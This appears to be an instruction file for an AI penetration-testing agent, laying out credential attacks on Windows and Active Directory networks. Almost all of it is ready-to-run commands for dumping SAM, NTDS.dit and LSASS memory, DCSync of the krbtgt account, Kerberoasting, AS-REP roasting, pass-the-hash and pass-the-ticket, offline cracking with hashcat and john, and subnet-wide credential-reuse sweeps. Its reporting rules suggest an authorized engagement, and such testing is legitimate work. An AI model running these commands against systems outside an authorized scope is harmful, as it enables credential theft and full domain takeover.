---
name: credential_attacks
description: Credential extraction and cracking — SAM/SYSTEM/SECURITY dumps, NTDS.dit, LSASS memory, Kerberoasting, AS-REP roasting, offline hash cracking with john/hashcat.
---

# Credential Attacks

## Credential Dumping

### SAM + SYSTEM (Local Accounts)

```bash
# Via NetExec (remote, needs admin SMB)
nxc smb 10.0.0.10 -u user -p pass --sam

# Via Impacket (remote)
impacket-secretsdump -hashes :<NTLM> corp.local/admin@10.0.0.10

# Via registry (if you have shell access)
reg save hklm\sam /workspace/output/sam.save
reg save hklm\system /workspace/output/system.save
# Then offline:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

### NTDS.dit (Domain Controller)

```bash
# Via NetExec (needs admin on DC)
nxc smb 10.0.0.1 -u admin -p pass --ntds

# Via Impacket
impacket-secretsdump -hashes :<NTLM> corp.local/admin@dc.corp.local

# Via ntdsutil (shell on DC, dump to file)
ntdsutil "ac i ntds" "ifm" "cr" "C:\temp\ntds" q q
# Then extract with:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### LSASS Memory Dump

```bash
# Via comsvcs.dll (no tools needed, PowerShell)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Via NetExec (remote)
nxc smb 10.0.0.10 -u user -p pass -M lsassy

# Via procdump
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

# Parse offline with pypykatz (available in sandbox)
pypykatz lsa minidump /workspace/output/lsass.dmp
```

### LSA Secrets (DPAPI, autologon, service accounts)

```bash
# Via NetExec
nxc smb 10.0.0.10 -u user -p pass --lsa

# Via Impacket
impacket-secretsdump -hashes :<NTLM> corp.local/admin@10.0.0.10
# LSA secrets include: DPAPI keys, autologon creds, service account passwords
```

### DCSync (Domain Admin Level)

```bash
# Via Impacket (needs replication rights)
impacket-secretsdump -just-dc corp.local/admin:pass@dc.corp.local

# Just the krbtgt (for golden ticket)
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@dc.corp.local

# Via Mimikatz (if you have shell on DC)
lsadump::dcsync /domain:corp.local /user:krbtgt
```

## Kerberos Attacks

### Kerberoasting (Service Account Passwords)

```bash
# Via Impacket (from Linux, need valid domain creds)
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 corp.local/user:pass

# Via NetExec
nxc smb 10.0.0.1 -u user -p pass --kerberoasting /workspace/output/kerb_hashes.txt

# Crack captured hashes
hashcat -m 13100 /workspace/output/kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting (No-Preauth Accounts)

```bash
# Via Impacket
impacket-GetNPUsers -no-pass -dc-ip 10.0.0.1 corp.local/ -usersfile users.txt

# Via NetExec
nxc smb 10.0.0.1 -u user -p pass --asreproast /workspace/output/asrep.txt

# Crack
hashcat -m 18200 /workspace/output/asrep.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash

```bash
# NTLM hash from SAM/NTDS/LSASS → authenticate without password
# Via NetExec (sweep subnet)
nxc smb 10.0.0.0/24 -u admin -H <NTLM_HASH> --local-auth

# Via Impacket
impacket-psexec -hashes :<NTLM> corp.local/admin@10.0.0.10

# Via evil-winrm
evil-winrm -i 10.0.0.10 -u admin -H <NTLM_HASH>
```

### Pass-the-Ticket / Overpass-the-Hash

```bash
# Request TGT with hash (overpass-the-hash)
impacket-getTGT -hashes :<NTLM> corp.local/user
# Result: user.ccache in current directory

# Use the ticket
export KRB5CCNAME=$(pwd)/user.ccache
klist
impacket-wmiexec -k -no-pass corp.local/user@dc.corp.local

# Pass existing ticket
# Copy .ccache or .kirbi from victim, then use it
```

## Offline Hash Cracking

### Tool Selection

| Hash type | Mode (-m) | Tool preference |
|---|---|---|
| NTLM | 1000 | hashcat (GPU) or john |
| NTLMv2 (responder) | 5600 | hashcat |
| Kerberos TGS (Kerberoast) | 13100 | hashcat |
| Kerberos AS-REP | 18200 | hashcat |
| bcrypt | 3200 | hashcat |
| sha512crypt | 1800 | john |
| SHA-256 | 1400 | hashcat |

### Commands

```bash
# Hashcat (GPU-accelerated, faster for large lists)
hashcat -m 1000 /workspace/output/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --show

# With rules (mutate passwords)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper (better for some formats)
john --wordlist=/usr/share/wordlists/rockyou.txt /workspace/output/shadow_hashes.txt

# John with format specification
john --format=NT --wordlist=rockyou.txt ntlm.txt

# Show cracked results
hashcat -m 1000 hashes.txt --show
john --show hashes.txt
```

### Wordlist Strategy

```bash
# Standard
/usr/share/wordlists/rockyou.txt

# Username-based mutations (create custom)
# company = ACME → try: ACME2026!, Acme@2026, acme2026, ACMEsummer!, etc.

# Target-specific (from information gathering)
# Names, dates, project names found on the host
```

## Credential Reuse Strategy

After cracking or dumping credentials, test them everywhere:

```bash
# Test cracked password across the network
nxc smb 10.0.0.0/24 -u users.txt -p 'CrackedPass1!' --continue-on-success
nxc winrm 10.0.0.0/24 -u users.txt -p 'CrackedPass1!' --continue-on-success
nxc ssh 10.0.0.0/24 -u users.txt -p 'CrackedPass1!' --continue-on-success

# Test local admin hash across network
nxc smb 10.0.0.0/24 -u administrator -H <hash> --local-auth --continue-on-success
```

## Evidence Rules

**Save ALL credential artifacts to `/workspace/output/`:**
- `sam_save.txt`, `ntds_dump.txt`, `lsass_parsed.txt`
- `responder_session.log`, `kerb_hashes.txt`
- `cracked_passwords.txt`

**Report each distinct credential discovery promptly via `create_internal_finding`:**
- finding_type: `credential`
- title: `[system] username`
- content: full credential detail (hash, cracked password, source, scope)
- severity: based on verified impact, using `internal/internal_reporting`; a discovered credential is not proof of successful authentication or privilege

For a dataset, preserve every entry in a complete attachment under
`/workspace/output/` and list it in `metadata.evidence_files`. One dataset may
use one finding; do not create a finding per row or duplicate the dataset in
parent summaries. Report validation status and known access separately.
